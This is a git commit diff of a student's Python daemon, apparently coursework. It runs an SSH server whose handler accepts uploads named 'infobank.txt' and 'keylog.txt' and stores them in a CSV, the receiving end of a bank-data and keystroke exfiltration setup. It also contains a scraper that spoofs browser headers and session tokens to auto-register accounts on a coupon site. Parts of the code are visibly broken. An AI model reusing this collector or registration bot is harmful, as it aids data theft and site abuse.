a5daa45743a51c7e9dcb46227b8d201d674884ca
francescolosi <f.losi789@gmail.com>
2020-04-16 12:34:18 -0400

    writes to file in var/run/

--- test_daemon.py
+++ test_daemon.py
@@ -1,7 +1,7 @@
 # test_daemon.py
 
 #==============================================================================
- #   Assignment:  Major Project - Tunelling Milestone 1
+ #   Assignment:  Major Project - A&W Coupon App
  #
  #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
  #     Language:  Python 3
@@ -26,13 +26,13 @@
  #             
  #   Required Features Not Included: N/A
  #
- #   Known Bugs:  N/A 
+ #   Known Bugs:  Children spawned from handling clients do not appear to be handeld by the sigChild terminator function and remain as zombies
  #      
  #
  #   Classification: N/A
  #
 #==============================================================================
-import requests
+
 import csv
 import errno
 import random
@@ -43,24 +43,123 @@ import logzero
 from logzero import logger
 from signal import SIGTERM
 import socket
-
 import paramiko
+from bs4 import BeautifulSoup
+import requests
 import threading
 import sys
+import signal
 import json
-import subprocess
-from stub_sftp import StubServer,  StubSFTPServer
 
+
+
+binds = ("::1",  9500)
 host_key = paramiko.RSAKey(filename='test_rsa.key')
 logzero.logfile("soupLogFile.log", maxBytes=1e6, backupCount=2)
 
-def getPid(pidfile, default=None):
-    try:
-        with open(pidfile) as f:
-            return int(f.read().strip())
-    except IOError:
-        return default
+def soup(dataLine):
+    ''''
+    This function represents the automated registration component of the application
+    It will scrape the target webpage and will sign the user up for it while imitiating a browser.
+    The scraper will pretent to be a browser by using a header that captures a session cookie and adds a token + session key to the payload
+    Data that is not received will be randomly generated(except for the pwd = "P@ssw0rd" and email)
+    
+    @Author: Alistair
+    @Date: April 8th 2020
+    
+    @param - dataLine list - the list of user provided data to submit
+    @Requires - BS4, Logger, requests, sys
+    '''
+    page  = requests.get("https://awcoupon.ca/en/register")
+    logger.info("======STARTING REGISTRATION======")
+    if page.status_code != 200:
+        logger.error("Cannot Locate the target coupon server")
+        print("Cannot Locate the target server")
+        return -1 #Failed to make some soup
+    
+    soup = BeautifulSoup(page.content,  'html.parser')
+    logger.info("Found target! Extracting Form...")
+    
+    #Extract the target registration form
+    token = (soup.find('input',  {'name' : '_token'}).get('value'))
+    session_key = (soup.find('input',  {'name' : '_session_key'}).get('value'))
+    
+    #The operational target
+    targetURL = "https://awcoupon.ca/en/register"
+    
+    #Find the cookies of a real browser
+    cookieJar = page.cookies
+    cookie_ = page.cookies['october_session']
+    cookie = 'october_session=' + cookie_
+    logger.info("Setting Target Cookie as:" + cookie) #I'm a real browser now
+    
+    #Header(What data must be imitated)
+    headers = {
+        'Host' : 'awcoupon.ca', 
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
+        'Accept': '*/*', 
+        'Accept-Language': 'en-US,en;q=0.5', 
+        'Accept-Encoding' :'gzip, deflate, br', 
+        'Referer': 'https://awcoupon.ca/en/register', 
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
+        'X-OCTOBER-REQUEST-HANDLER': 'onRegister', 
+        'X-OCTOBER-REQUEST-PARTIALS': '', 
+        'X-OCTOBER-REQUEST-FLASH': '1', 
+        'X-Requested-With': 'XMLHttpRequest', 
+        'Content-Length': '281', 
+        'Cookie': cookie, 
+        'Connection': 'keep-alive', 
+    }
+    #POST response form (data is brough to the target)
+    #TODO - Data needs to be sent here
+    response = {
+    '_session_key' :  session_key, #yanked from the webpage
+    '_token' : token,  #yanked from the webpage
+    'name': 'ABC', 
+    'email':'abc123@ualmail.com', 
+    'profile[postal_code]': 'k5g2p1', 
+    'password': 'P@ssw0rd', 
+    'password_confirmation': 'P@ssw0rd', 
+    'profile[user_region]' : '', 
+    'profile[lang]': 'en'
+    
+    }
+    logger.info("Header & Response created!")
+    
+    #POST reqeust to target
+    logger.info("Attempting registration...")
+    test_response = requests.post(targetURL,  data=response,  headers=headers,  cookies=cookieJar)
+    
+    #Fetch result
+    result = BeautifulSoup(test_response.text,  'html.parser')
+    #200 = OK(probably) and anything else needs logged.
+    if(test_response.status_code != 200):
+        logger.error("User could not be registered. Response code was: " + str(test_response.status_code))
+        logger.error("Error was:" + test_response.text)
+        logger.info("======ENDING REGISTRATION======")
+        return -1
+    
+    logger.info("Registered the user! :p")
+    logger.info("======ENDING REGISTRATION======")
+    return 0
+def child():
+    childWrites="in child"
+    logger.info(f"Child: {os.getpid()} {childWrites} ")
+
+def parent():
+    logger.info(f"Parent: {os.getpid()} is logging")
+    
+def sigterm_handler(signo,  frame):
+    ''''
+    This function handles the cleanup of the parent daemon when the stop command is passed
+    param - sigNo 
+    param - frames
+    return - exit state
+    '''
+    raise  SystemExit(1)
+    
 def grimReaper(signalNumber,frame):
+    
    while True:
         try:
             pid,status=os.waitpid(-1,os.WNOHANG)
@@ -73,88 +172,86 @@ def grimReaper(signalNumber,frame):
 def exitErr(msg,status=1):
    print(msg)
    sys.exit(status)
+   
+def getPid(pidfile,default=None):
+    try:
+        with open(pidfile) as f:
+            return int(f.read().strip())
+    except IOError:
+        return default
 
 class Daemon(object):
     def __init__(self, pidfile,stdin='/dev/null',stdout='/dev/null',stderr='/dev/null'):
-      self.stdin=stdin
-      self.stdout=stdout
-      self.stderr=stderr
-      self.pidfile=pidfile
-   
-    def startService(self):
-        print("starting service")
-        try:           #first fork
-            if os.fork()>0:
-                raise SystemExit(0)
-        except OSError as e:
-            logger.info("First fork failed: %d (%s)"%(e.errno,e.strerror))
-            
-        os.chdir('/')
-        os.setsid()
-        os.setuid(1000)
-            
-        try:        #2nd fork
-            if os.fork()>0:
-                raise SystemExit(0)
-        except OSError as e:
-            logger.info("2nd fork failed: %d (%s)"%(e.errno,e.strerror))
-                
-        sys.stdout.flush()
-        sys.stderr.flush()
-        with open(self.stdin, 'rb', 0) as f:
-            os.dup2(f.fileno(), sys.stdin.fileno())
-        with open(self.stdout, 'ab', 0) as f:
-            os.dup2(f.fileno(), sys.stdout.fileno())
-        with open(self.stderr, 'ab', 0) as f:
-            os.dup2(f.fileno(),  sys.stderr.fileno())
-        #si=open(self.stdin,'r')
-        #so=open(self.stdout,'a+')
-        #se=open(self.stderr,'a+')
-        #os.dup2(si.fileno(),sys.stdin.fileno())
-        #os.dup2(so.fileno(),sys.stdout.fileno())
-        #os.dup2(se.fileno(),sys.stderr.fileno())
-        
-        #pid=str(os.getpid())
+          self.stdin=stdin
+          self.stdout=stdout
+          self.stderr=stderr
+          self.pidfile=pidfile
 
-        with open(self.pidfile, 'w') as f:
-            print(os.getpid(), file=f)
+   
+    def startService(self,  stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
+        ''''
+        This function handles the intiial setup needed in order to start or stop the Daemon. 
+        For stopping the program, it will find the PID file and remove it. Then, it will exit the daemon.
+        For starting the program, it will check for an existing PID file and if not available, writes one and double forks to generate a daemonized daemon.
+        Function will log as needed to the logfile which exist next to the file that was executed as dpi912logFile
+        '''
+        pidFile = '/var/run/daemon/daemon.pid'  #instead of /var/run/ which requires root, which I dont have the pwd for.
+        self.pidfile= pidFile
+        #if init start is passed, start the server
         
-        atexit.register(lambda:os.remove(self.pidfile))
-        signal.signal(signal.SIGTERM,grimReaper)
-        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
-        sock.bind(getBinds())
-        sock.listen(100)
-        print('[+] Listening for connection ...')
-        while True:
-            try:
-                conn, addr=sock.accept()
-            except Exception:
-                print("problem accepting connection")
-                
-            pid=os.fork()
-            if pid==0:
-                sock.close()
-                handleData()
-                conn.close()
-                os._exit(0)
+        if 'start'==sys.argv[1]:
+            print("Attempting to start on ipv6 localhost via socket "+str(binds) +"- see logs for further information")
+            if os.path.exists(pidFile):
+                logger.warning("Daemon PID File exists, is this Daemon already running? Exiting...")
+                sys.exit(0)
             else:
-                conn.close()
-    
+                try:
+                    if os.fork() > 0:
+                        raise SystemExit(0)
+                except OSError as e:
+                    logger.error("Unable to fork for fork #1")
+                
+                os.chdir('/var/run/daemon')
+                try:
+                    os.setsid()
+                    os.setuid(1000) #so how exactly does this become root if you must be root to set this privilage?
+                except Exception as e:
+                    logger.warning("Could not change the GID and/or UID - is this process privilaged?")
+                    logger.warning(str(e))
+                    
+                # End Leadership by double forking
+                try:
+                    if os.fork() > 0:
+                        raise SystemExit(0)
+                except OSError as e:
+                    logger.error("Unable to fork for fork #2")
+                    
+                # Flush I/O  buffers  and lockdown stderr/out/in
+                sys.stdout.flush() 
+                sys.stderr.flush()
+                
+                with open(pidFile,'w')  as f:
+                    print(os.getpid(),file=f)
+                    
+                # PID is to be removed when this daemon stops
+                atexit.register(lambda:  os.remove(pidFile))
+                signal.signal(signal.SIGTERM,  sigterm_handler)
+        
+    def delpid(self):
+        os.remove(self.pidfile)
     
     def start(self):
-        print("starting daemon")
         if getPid(self.pidfile):
-            msg="Pidfile %s already exists. daemon already running"
-            exitErr(msg%self.pidfile)
-        self.startService()
+            print("PID Exists - remove it")
+            logger.info("pidfile exists. deamon is running")
+        self.startService(self)
         self.run()
    
     def stop(self):
         pid=getPid(self.pidfile)
         if not pid:
-            msg="Pidfile dont exist, daemon not running"
-            print(msg%self.pidfile)
+            print("PID doesnt exist")
+            logger.info("pidfile dont exist. deamon not running")
             return
         try:
             while True:
@@ -165,88 +262,113 @@ class Daemon(object):
             if 'No such process' in error:
                 if os.path.exists(self.pidfile):
                     os.remove(self.pidfile)
-                else:
-                    exitErr(error)
-    
+            else:
+                exitErr(error)
+
     def restart(self):
         self.stop()
         self.start()
    
     def run(self):
-        raise NotImplementedError
+        print("Error - Invoked Base class RUN")
+            
    
 def startParamiko(client):
-    try:
-        t = paramiko.Transport(client)
-        t.add_server_key(host_key)
-        t.set_subsystem_handler('sftp', paramiko.SFTPServer, StubSFTPServer)
-        server = StubServer()
+  return -1
+  
+def endConnection(sigNo, frames):
+    '''
+    This function handles the cleanup of zombie children after their work has been completed
+    param - sigNo 
+    param - frames
+    return - exit state
+    '''
+    while True:
         try:
-            t.start_server(server=server)
-        except paramiko.SSHException as x:
-            print('[-] SSH negotiation failed.')
-     
-        chan = t.accept(20)
-        print('[+] Authenticated!')
-        while True:
-            chan=t.accept(20)
-            handleData()
-            print(chan)
-            
-    except Exception as e:
-        print('[-] Caught exception: '  + str(e))
-        try:
-            t.close()
-        except:
-            pass
-        sys.exit(1)
-
+            pid, status = os.waitpid(-1, os.WNOHANG) #any child must be ended
+        except Exception:
+            return -1
+        if pid == 0:
+            return 1
+        
 class MyDaemon(Daemon):
    def run(self):
-      while True:
-         time.sleep(1)
-    
-def handleData():
-    file=open('transported.txt','r')#first arg may change, its the csv file name
-    info=file.read()
-    file.close()
-    file=open("peoplesInfo.csv", 'a', newline='')
-    file.write(info)
-    file.close
+    try:
+        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+        sock.bind(binds)
+        signal.signal(signal.SIGCHLD,endConnection) #estabish a zombie child killer
+        
+    except Exception as e:
+        print("*** Bind failed: " + str(e))
+        e.print_exc()
+        sys.exit(1)
+    try:
+        sock.listen(100)
+        print("Listening for connection ...")
+        logger.info("Listening for connection...")
+    except Exception as e:
+            print("*** Listen/accept failed: " + str(e))
+            traceback.print_exc()
+            sys.exit(1)
+    while True:
+        print("Waiting...")
+
+        client, addr = sock.accept()
+        pid = os.fork()
+        if pid == 0:
+            print("Got a connection!")
+            t = paramiko.Transport(client)
+            
+            t.add_server_key(host_key)
+            server = Server()
+            try:
+                t.start_server(server=server)
+            except paramiko.SSHException:
+                print("*** SSH negotiation failed.")
+                sys.exit(1)
+            # wait for auth
+            clientCon = t.accept(20)
+            if clientCon is None:
+                print("*** No channel ***")
+                sys.exit(1)
+            print("Authenticated!")
+            print("Handling this connection...")
+
+            handle(clientCon)
+            clientCon.close()
+            client.close()
+            os._exit(0)
+        else:
+            print("I am alive")
+
+def handle(conn): #
+    chan = conn
+    request = chan.recv(1024).decode()
+    logger.info("Client said this ->" + str(request))
+    print("Client said this ->" + str(request))
+    print(str(request))
+    if request=='infobank.txt':
+        print("recieved bank.txt")
+        info=chan.recv(1024).decode('utf-8')
+        with open('dosthiswork.csv', 'a',  newline='') as writer:
+            writer.write(info)
+    elif request=='keylog.txt':
+        chan.recv(2048)
     response=requests.get("http://ip-api.com/json/99.247.166.240")
     print(response.status_code)
     txt=json.dumps(response.json())
     print(txt)
-    #with open('peopleInfo.csv','w',newLine='') as f:#first arg may change, its the csv file name
+    #signUp(data1[i])
+    print("Done!")
+    try:
+        conn.close()
+    except:
+        pass
+        
+    return 0
     
-        #for i in range():
-          #  for j in range(7):#any blank inputs are chaged to null
-             #   if (len(data[i][j])<1):
-               #     data[i][j]="null"
-                #thewriter.writerow([data1[i][0],data1[i][1],data1[i][2],data1[i][3],data1[i][4],data1[i][5],data1[i][6]])
-            #Alistairs signUp function called here with each row of data
-            #signUp(data1[i])
-
-def getBinds():
-    '''
-    This function grabs the binding arguements for the connection
-    In the clients case, this is the IPv6 address and the socket #
-    return tuple - The connection properties 
-    '''
-    sockNum = -1
-    sockIp = ""
-    while sockNum < 0 and not sockIp:
-        try: 
-            sockNumTest = int(input("Provide a socket # for the daemon to host:"))
-            sockIpTest = str(input("Provide an IPv6 addresss to host on:"))
-        except Exception:
-            print("Please Try Again...\n")
-        else:
-            sockNum = sockNumTest   
-            sockIp = sockIpTest     
-
-    return (sockIpTest, sockNumTest)
-
+    
 class Server (paramiko.ServerInterface):
     host_key = paramiko.RSAKey(filename='test_rsa.key')
     def _init_(self):
@@ -263,12 +385,13 @@ class Server (paramiko.ServerInterface):
 
 
 if __name__=="__main__":
-    logzero.logfile("/tmp/rotating-logfile.log",maxBytes=1e6, backupCount=3, disableStderrLogger=True)
+    logzero.logfile("/home/lab/sandbox/serverLogs.log",maxBytes=1e6, backupCount=3, disableStderrLogger=True)
     daemonPid=os.getpid()
     logger.info(f"Started {daemonPid}")
-    daemon=MyDaemon('/tmp/daemon-example69.pid')
+    daemon=MyDaemon('/var/run/daemon/daemon.pid')
     if len(sys.argv)==2:
         if 'start'==sys.argv[1]:
+            daemon.stop()
             daemon.start()
         elif 'stop'==sys.argv[1]:
                 daemon.stop()
